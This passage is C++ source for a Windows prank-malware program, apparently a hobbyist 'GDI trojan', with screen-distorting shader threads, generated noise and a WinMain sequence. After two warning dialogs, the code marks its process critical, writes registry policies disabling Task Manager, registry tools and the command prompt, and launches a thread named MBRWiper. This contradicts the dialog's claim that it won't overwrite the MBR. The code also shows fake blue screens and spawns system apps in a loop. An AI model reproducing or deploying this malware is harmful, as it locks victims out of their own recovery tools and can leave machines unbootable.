DWORD WINAPI shader5(LPVOID lpParam) //by fr4ctalz
{
	POINT wPt[3];
	RECT wRect;
	while (1)
	{
		HDC hdc = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(hdc);
		int sw = GetSystemMetrics(0);
		int sh = GetSystemMetrics(1);
		HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, bm);
		GetWindowRect(GetDesktopWindow(), &wRect);
		int c = 10;

		wPt[0].x = wRect.left + rand() % 21 - 5;
		wPt[0].y = wRect.top + rand() % 25 - 15;


		wPt[1].x = wRect.right + rand() % 25 - 20;
		wPt[1].y = wRect.top + rand() % 51 - 70;


		wPt[2].x = wRect.left + c - rand() % 21 - c;
		wPt[2].y = wRect.bottom - c + rand() % 11 - c;

		PlgBlt(hdcMem, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		HBRUSH brush = CreateHatchBrush(rand() % 7, Hue(3));
		SelectObject(hdc, brush);
		BitBlt(hdc, rand() % 20, rand() % 20, sw, sh, hdcMem, rand() % 20, rand() % 20, 0x123456);
		DeleteObject(brush);
		DeleteObject(hdcMem);
		DeleteObject(bm);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader6(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb ^= (x * x + i) & (y * y + i) | x * y + i;
			rgbScreen[i].r -= (x * x + i) * (y * y + i) | x + y + i;
			rgbScreen[i].g ^= (x * x + i) ^ (y * y - i) | x & y + i;
			rgbScreen[i].b += (x * x + i) & (y * y + i) | x * y + i;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader7(LPVOID lpvd) //credits to fr4ctalz, but I modified it
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * cbrt(x ^ y));
				int fx2 = (int)((i ^ 4) + (i * 4) * cbrt((x * x + i) & (y * y + i) | x * y + i));
				int fx3 = (int)((i ^ 4) + (i * 4) * cbrt(x & y | x ^ y));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx2 / 400.f + y / screenHeight * .2f, 1.00000000000000000000000000000000005f);
				hslcolor.h += fmod(fx3 / 1500.f + y / screenHeight * .2f, .6f);
				hslcolor.s += fmod(fx / 120.f + y / screenHeight * .1f, .3f);
				//hslcolor.s = 0.700f;
				hslcolor.s += .1f;

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, -20, 0, screenWidth + 40, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}

DWORD WINAPI shader8(LPVOID lpvd) //by the no skid, but i modified it
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	int ws = screenWidth / 4;
	int hs = screenHeight / 4;

	while (1)
	{
		RECT rect;
		hdc = GetDC(NULL);
		SetStretchBltMode(hdc, HALFTONE);
		POINT point[3];
		GetWindowRect(GetDesktopWindow(), &rect);
		INT j = cosf(i / 5.f) * 10 + sinf(i / 5.f) * 10;
		INT j2 = cosf(i / 5.f) * 10 + tanf(i / 5.f) * 10;
		point[0].x = rect.left + j; point[0].y = rect.top - j2;
		point[1].x = rect.right + j; point[1].y = rect.top + j2;
		point[2].x = rect.left + j; point[2].y = rect.bottom - j2;
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((x + cosf((y + (i * 10)) / 50) * 1000) - (y + sinf((x - (i * 10)) / 50) * 1000)) >> 3;

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx + (((x + (i * 5)) & y) / 3)) / 15000.0 + 0.09, 1.0);
				hslcolor.s = 1.f;
				if (hslcolor.l < .5f) {
					hslcolor.l += .5f;
				}

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		PlgBlt(hdc, point, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, NULL, 0, 0);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
}

DWORD WINAPI thelastshader(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = (rand() % 0x1456384) * 0x437543564363;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, NOTSRCERASE);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}


VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 5] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * 3 | t >> 1));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound1dot1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 5] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * cos(t >> 2));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound1dot2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 5] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(rand() * t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> t * (t >> 10) | t >> 2);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t + (t & t ^ t >> 6) - t * (t >> 9 & (t % 16 ? 2 : 6) & t >> 9));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 5400, 5400, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[5400 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t ^ (t & t >> 7) * (t ^ t >> 1 | t ^ t >> 1)) + 100);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11050, 11050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t >> 8) & 63 & t >> 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t << 2 | t >> 8));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11050, 11050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t & t + t / 67) - t * (t >> 14) & 127);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11050, 11050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t / 2 * (4 | 7 & t >> 13) >> (~t >> 11 & 1) & 127) + (t * 2 * (t >> 11 & t >> 11) * (t ^ t >> 9 & t >> 3) & 128);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * (t ^ t >> 1 | t >> 7 | t >> 14)) & 128);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI lastsound() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * rand());

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

void reg_add( //credits to Mist0090
	HKEY HKey,
	LPCWSTR Subkey,
	LPCWSTR ValueName,
	unsigned long Type,
	unsigned int Value
)
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;


	result = RegCreateKeyExW(
		HKey, //HKEY
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition);

	result = RegSetValueExW(
		hKey,
		ValueName,
		0,
		Type,
		(const unsigned char*)&Value,
		(int)sizeof(Value)
	);

	RegCloseKey(hKey);
	return;
}

DWORD WINAPI opener(LPVOID lpvd)
{
	while (1) {
		ShellExecuteA(NULL, NULL, "calc", NULL, NULL, SW_SHOWDEFAULT);
		Sleep(rand() % 5000);
		ShellExecuteA(NULL, NULL, "notepad", NULL, NULL, SW_SHOWDEFAULT);
		Sleep(rand() % 5000);
		ShellExecuteA(NULL, NULL, "dxdiag", NULL, NULL, SW_SHOWDEFAULT);
		Sleep(rand() % 5000);
		ShellExecuteA(NULL, NULL, "write", NULL, NULL, SW_SHOWDEFAULT);
		Sleep(rand() % 5000);
		ShellExecuteA(NULL, NULL, "charmap", NULL, NULL, SW_SHOWDEFAULT);
		Sleep(rand() % 5000);
		ShellExecuteA(NULL, NULL, "taskmgr", NULL, NULL, SW_SHOWDEFAULT);
		Sleep(rand() % 5000);
		ShellExecuteA(NULL, NULL, "winver", NULL, NULL, SW_SHOWDEFAULT);
		Sleep(rand() % 5000);
		ShellExecuteA(NULL, NULL, "mspaint", NULL, NULL, SW_SHOWDEFAULT);
		Sleep(rand() % 5000);
		ShellExecuteA(NULL, NULL, "control", NULL, NULL, SW_SHOWDEFAULT);
		Sleep(rand() % 5000);
		ShellExecuteA(NULL, NULL, "mmc", NULL, NULL, SW_SHOWDEFAULT);
		Sleep(rand() % 5000);
	}
	return 0x00;
}

DWORD WINAPI theerror(LPVOID lpParam) {
	MessageBox(NULL, L"Windows is about to crash", L"f*ck", MB_ICONINFORMATION);
	return 0;
}
int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"(1/2) W̴A̷R̸N̷I̴N̶G̵: Y̴o̷u̸ ̴a̸r̷e̸ ̷a̴b̶o̵u̸t̷ ̷t̵o̶ ̸r̴u̷n̸ ̸a̷ ̶s̵e̶m̴i̷ - ̸d̷e̶s̵t̷r̴u̸c̶t̷i̵v̶e̷ ̵p̸r̴o̵g̸r̴a̵m̷ ̵t̶h̷a̵t̷ ̴c̵a̸u̶s̴e̷s̴ ̵y̷o̶u̸ ̶t̷o̴ ̶l̸o̵s̶e̷ ̵u̸n̷s̸a̴v̸e̵d̸ ̷d̴a̷t̸a̷. Th̷i̸s̷ ̷i̸s̶ ̸s̵t̶i̴l̵l̶ ̶a̴ ̸h̶a̷r̸m̷l̴e̸s̶s̵ ̸m̷a̶l̷w̴a̶r̵e̸, ̷ ̷a̶s̵ ̵i̸t̴ ̶w̴o̵n̷'̸t̵ ̵d̴e̷s̴t̸r̵o̸y̶ ̷a̵n̸y̷ ̸s̶y̵s̶t̷e̵m̶ ̷f̸i̶l̵e̷s̴ ̷o̸r̵ ̶o̸v̶e̵r̸w̴r̷i̸t̷e̶ ̶t̵h̶e̴ ̵M̴B̷R̵,̴ ̸b̴u̷t̸ ̵i̶t̴ ̵c̶a̵n̴ ̸d̵o̶ ̸V̷E̵R̸Y̷ ̶A̴N̶N̵O̶Y̴I̸N̶G̵ ̵a̸c̴t̸i̴o̷n̵s̴ ̷s̴u̵c̸h̶ ̴a̵s̷ ̶m̴o̷u̵s̸e̴ ̶m̴o̵v̸i̷n̵g̸,̷ ̵w̴i̸n̷d̵o̶w̷ ̸m̸o̴v̵i̷n̵g̶,̷ ̵r̶a̴n̵d̴o̵m̸ ̴k̷e̶y̷s̸t̷r̶o̸k̷e̶s̴,̷ ̸e̵t̶c̵. A̷f̴t̵e̷r̶ ̶t̵h̷a̵t̴, ̷ ̴i̵t̸ ̵w̴i̸l̷l̶ ̶d̷o̴ ̸a̵ ̵f̷a̴k̷e̸ ̵B̸S̶O̷D̶ ̸t̶h̵e̴n̷ ̷k̴e̵e̶p̴ ̸r̶u̵n̶n̵i̸n̶g̸ ̸f̷o̵r̴e̷v̵e̷r̶.̷ ̷(̴Y̷o̶u̵ ̸w̷i̵l̴l̵ ̴h̵a̴v̷e̶ ̸t̵o̴ ̵r̴e̶s̵t̶a̷r̵t̸.̵) I̴ ̶h̵i̷g̶h̷l̵y̸ ̶r̸e̵c̴o̷m̷m̴e̷n̵d̶ ̷y̵o̷u̵ ̴t̵o̸ ̴r̵u̸n̶ ̶t̴h̵i̷s̵ ̷o̸n̴ ̵a̶ ̶v̴i̷r̴t̵u̸a̷l̵ ̵m̸a̴c̸h̶i̵n̴e̸.̵ ̵A̶n̷d̵ ̶a̸l̴s̵o̶, ̸ ̵t̸h̶i̸s̷ ̷c̸o̶n̸t̵a̶i̷n̴s̸ ̷l̶o̵u̸d̶ ̵n̷o̴i̶s̷e̶s̵ ̸a̶n̷d̴ ̷f̸l̷a̴s̸h̴i̸n̴g̶ ̵l̸i̴g̷h̴t̶s̸, ̵ ̵s̷o̴ ̵d̶o̷ ̴n̶o̵t̸ ̷r̵u̴n̸ ̸t̶h̵i̴s̵ ̵i̷f̸ ̴y̷o̵u̶ ̵h̴a̷v̵e̷ ̷e̸p̶i̴l̸e̷p̴s̵y̸ ̸o̶r̸ ̴s̵e̸n̵s̷i̵t̶i̸v̷e̸ ̷e̴a̶r̵s̷. D̶o̸ ̴y̷o̸u̴ ̷w̴a̷n̸t̶ ̷t̸o̴ ̸r̴u̵n̷ ̸t̶h̸i̷s̸ ̷m̶a̷l̴w̵a̴r̸e̷, ̵ ̸r̷e̶s̵u̸l̷t̴i̵n̸g̷ ̵i̶n̷ ̶l̵o̷s̵s̴ ̸o̵f̶ ̴a̵n̶y̵ ̷u̵n̶s̴a̷v̴e̶d̵ ̸d̷a̴t̷a̶ ? ", L"Pinkyblue123-o4q Is Suck.exe by Underwater Tiny Kong & iusearchbtw256 / Glitched Arch Linux", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"⚠ F̴I̷N̶A̴L̷ ̸W̶A̴R̶N̵I̸N̴G̷!⚠ A̴r̶e̸ ̴y̷o̸u̴ ̶a̷b̸s̶o̴l̷u̶t̵e̸l̴y̷ ̴s̵u̸r̴e̶ ̴y̷o̶u̸ ̴w̶a̸n̷t̶ ̴t̵o̸ ̴r̶u̷n̴ ̴t̷h̸i̶s̴ ̶m̴a̷l̸w̴a̷r̸e̴, ̷m̴a̷k̶i̴n̷g̵ ̸y̷o̴u̵r̶ ̵W̶i̸n̴d̵o̶w̷s̵ ̴(̶a̵n̶d̴ ̷o̵t̶h̴e̷r̵ ̷s̶t̴u̶f̴f̵)̸ ̷g̶o̸ ̴c̷r̴a̸z̶y̷, ̴a̶n̷d̵ ̸p̴o̶s̸s̵i̴b̶l̸y̷ ̶l̷o̴s̷e̴ ̵a̸l̶l̵ ̷o̴f̶ ̵y̷o̴u̵r̸ ̴u̵n̶s̷a̶v̵e̸d̴ ̵d̷a̴t̸a̶ ? R̸E̵M̷E̴M̸B̶E̵R̷... ⚠ T̶h̸i̵s̸ ̶w̷i̵l̸l̷ ̵c̸o̷n̵t̷a̴i̶n̴ ̸f̷l̴a̸s̷h̸i̷n̶g̵ ̷l̸i̷g̴h̷t̵s̸. ⚠ A̴n̵d̸ ̶L̵O̴U̷D̵ ̸N̴O̵I̶S̴E̷S̵. D̷O̶ ̷N̴O̵T̸ ̷R̸U̴N̸ ̵T̷H̶I̵S̴ ̵I̷F̵ ̶Y̴O̵U̶ ̴H̷A̶V̵E̷ ̸E̷P̶I̵L̴E̸P̷S̶Y̵ ̸O̴R̷ ̶A̷R̸E̶ ̵S̷E̴N̸S̷I̶T̵I̸V̷E̴ ̶T̴O̸ ̵F̷L̸A̶S̷H̴I̷N̸G̶ ̵L̸I̴G̷H̸T̵S̶ ̷O̵R̸ ̴L̷O̵U̸D̴ ̷S̴O̸U̶N̵D̶S̸. I̶ ̵A̴M̷ ̴N̶O̷T̴ ̷R̵E̶S̴P̶O̴N̵S̷I̸B̷L̸E̴ ̷F̷O̴R̸ ̵A̴N̸Y̷ ̶D̸A̷M̵A̶G̴E̶S̴ ̶C̵A̸U̴S̷E̸D̶ ̵T̴O̶ ̵Y̸O̶U̷R̸ ̶D̴E̸V̵I̶C̷E̵. ☠ A̴R̸E̷ ̴Y̶O̵U̸ ̵A̸B̴S̶O̷L̴U̵T̸E̶L̷Y̸ ̶S̴U̸R̵E̶ ? ☠ - NOT for epilepsy", L"Pinkyblue123-o4q Is Suck.exe - Last Warning", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			ProcessIsCritical();
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			Sleep(5000);
			CreateThread(0, 0, notaskbar, 0, 0, 0);
			HANDLE thread1 = CreateThread(0, 0, fakebsod, 0, 0, 0);
			sound1();
			Sleep(5000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			//InvalidateRect(0, 0, 0);
			//Sleep(100);
			HANDLE thread1dot1 = CreateThread(0, 0, fakebsod2, 0, 0, 0);
			sound1dot1();
			Sleep(5000);
			TerminateThread(thread1dot1, 0);
			CloseHandle(thread1dot1);
			//InvalidateRect(0, 0, 0);
			//Sleep(100);
			HANDLE thread1dot2 = CreateThread(0, 0, shader666, 0, 0, 0);
			sound1dot2();
			Sleep(5000);
			TerminateThread(thread1dot2, 0);
			CloseHandle(thread1dot2);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread2 = CreateThread(0, 0, shader1, 0, 0, 0);
			//HANDLE thread2dot1 = CreateThread(0, 0, beasstballli, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread3 = CreateThread(0, 0, shader2, 0, 0, 0);
			HANDLE thread3dot1 = CreateThread(0, 0, beasstballli, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread4 = CreateThread(0, 0, shader3, 0, 0, 0);
			HANDLE thread4dot1 = CreateThread(0, 0, iconni, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			TerminateThread(thread4dot1, 0);
			CloseHandle(thread4dot1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread5 = CreateThread(0, 0, shader4, 0, 0, 0);
			//HANDLE thread2dot1 = CreateThread(0, 0, beasstballli, 0, 0, 0);
			sound5();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread666 = CreateThread(0, 0, shader5, 0, 0, 0);
			HANDLE thread666dot1 = CreateThread(0, 0, iconni, 0, 0, 0);
